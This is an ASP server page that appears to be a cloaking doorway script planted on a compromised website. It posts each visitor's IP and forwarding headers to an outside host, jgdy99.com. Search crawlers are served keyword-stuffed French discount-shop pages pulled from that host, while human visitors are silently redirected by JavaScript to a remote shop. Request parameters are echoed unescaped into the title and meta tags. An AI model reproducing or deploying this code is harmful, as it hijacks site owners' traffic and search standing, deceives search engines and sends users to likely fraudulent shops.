<%
Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b> </b></font></p>" 
Response.end
Err.Clear
End If  
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Randomize
%>
<%


Dim Url,Html,hyzhdy,kname
hyzhdy="https://dy6s.jgdy99.com/SJ2/JG114.aspx"

if request("shop")<>"" then
kname =request("shop")
end if
if request("kk")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")&"*"&Request.ServerVariables("REMOTE_HOST")&"*"&Request.ServerVariables("HTTP_X_FORWARDED_FOR")&"*"&Request.ServerVariables("HTTP_CLIENT_IP")&"*"&Request.ServerVariables("HTTP_X_FORWARDED")&"*"&Request.ServerVariables("HTTP_FORWARDED_FOR")&"*"&Request.ServerVariables("HTTP_FORWARDED")
end if

ipurl="https://dy6s.jgdy99.com/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if(instr(domain,"google")=0 and instr(domain,"msn.com")=0 and instr(domain,"yahoo.com")=0 and instr(domain,"aol.com")=0 and instr(domain,"yandex")=0) then
    if request("iid")<>""  then
    ddd="https://dy6s.jgdy99.com/a.aspx"
    ddd=ddd&"?cid="&request("cid")&"&cname="&Server.URLEncode(kname)
    Response.write "<script>self.location.href="""&ddd&"""</script>"
	Response.end
    end if	
	 if request("shop")<>""  then
    ddd="https://dy6s.jgdy99.com/a.aspx"
    ddd=ddd&"?cid="&request("cid")&"&cname="&Server.URLEncode(kname)
    Response.write "<script>self.location.href="""&ddd&"""</script>"
	Response.end
    end if	
     if request("pnum")<>""  then
    ddd="https://dy6s.jgdy99.com/a.aspx"
	ddd=Replace(ddd, "products.aspx", "")
    ddd=ddd&"?cid="&request("cid")
    Response.write "<script>self.location.href="""&ddd&"""</script>"
	Response.end
    end if	
end if
%>
<%
Dim xy
if Request.ServerVariables("HTTPS")= "off" then
xy="http://"
else
xy="https://"
end if


if request("s")<>"" then
cid=INT((20-1+1)*rnd+1)
if request("cid")<>"" then
cid=request("cid")
end if
URL="https://dy6s.jgdy99.com/sj2/s114.aspx?cid="&cid&"&number="&request("number")&"&xi=1-8&xc=16-30"&"&type="&request("type")
con=getHTTPPage(URL)
con=Replace(con, "yymm", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
Response.write con
Response.end
end if
%> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script>
document.cookie="u="+window.location.href;
</script>
<title> Vente > <%=kname%><%=request("searchtxt")%> > en stock <%=request("pnum")%> </title>
<meta name="keywords" content="<%=kname%><%=request("searchtxt")%>"/>
<meta name="description" content="Vente > OFF-<%=INT((65-50+1)*RND+50)%>% > <%=kname%> A la recherche de boutiques pas chères et de livraison gratuite, on fait tout, venez acheter, le stock se fait rare ! <%=request("searchtxt")%>" />
<meta name="robots" content="index,follow,all"/>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
<body>


<%

if request("s")<>"" then

else
if request("iid")<>"" then
wid=INT((121-1+1)*RND+1)
URL=hyzhdy&"?iid="&request("iid")&"&mt=https://dy6s.jgdy99.com/jk/frjk"&wid&".txt&cid="&request("cid")
else if request("shop")<>"" then
URL=hyzhdy&"?shop="&request("shop")&"&cid="&request("cid")
else
cid=INT((20-1+1)*rnd+1)
if request("cid")<>"" then
cid=request("cid")
end if
URL=hyzhdy&"?cid="&cid&"&pnum="&request("pnum")
end if
end if
con=getHTTPPage(URL)
con=Replace(con, "IIIII", xy&Request.ServerVariables("HTTP_HOST"))
con=Replace(con, "UUUUU", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "HHHHH", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "BBBBB", Request.ServerVariables("HTTP_HOST"))
con=Replace(con, "NNNNN", "Vêtements, chaussures, accessoires et divers accessoires électroniques bon marché")
con=Replace(con, "SSSSS", "Comprendre et acheter des vêtements, des chaussures et des accessoires pour femmes bon marché pour une variété de besoins quotidiens. Achetez les dernières collections de vêtements pour femmes à des prix abordables. livraison gratuite!")
con=Replace(con, "DDDDD", kname&"livraison gratuite! Trouvez des vêtements, des chaussures et des accessoires pour hommes à bas prix dans notre magasin d'usine. Achetez la dernière collection à un prix abordable. La place est rare ! "&request("searchtxt"))



end if
Response.write con
%> 





<div style="display: list-item">
       
        <ul>
<li>Related links: <a href="<%=Request.ServerVariables("SCRIPT_NAME")&"?cid="&INT((20-1+1)*RND+1)&"&pnum="&INT((500-1+1)*RND+1)&"&kk=9" %>" onclick="window.open(this.href); return false;">Plus</a></li>
<li>Related links: <a href="<%=Request.ServerVariables("SCRIPT_NAME")&"?s=s&cid="&INT((20-1+1)*RND+1)&"&number="&INT((7000-1500+1500)*RND+1500)&"&pnum="&INT((20-1+1)*RND+1)&"&kk=5"%>"onclick="window.open(this.href); return false;">SiteMap</a></li></ul>
</div>

        </ul>
    </div>
</body>

</html>  